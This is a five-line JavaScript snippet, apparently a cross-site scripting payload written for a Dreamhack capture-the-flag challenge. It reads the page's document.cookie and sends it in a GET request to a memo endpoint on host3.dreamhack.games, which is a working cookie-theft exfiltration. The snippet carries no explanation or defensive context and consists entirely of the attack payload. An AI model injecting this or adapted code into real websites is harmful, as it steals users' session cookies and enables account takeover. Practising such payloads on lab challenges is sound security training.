var xmlHttp = new XMLHttpRequest();
var c = document.cookie;
var x = "http://host3.dreamhack.games:11511/memo?memo="+c;
xmlHttp.open('GET', x, true);
xmlHttp.send();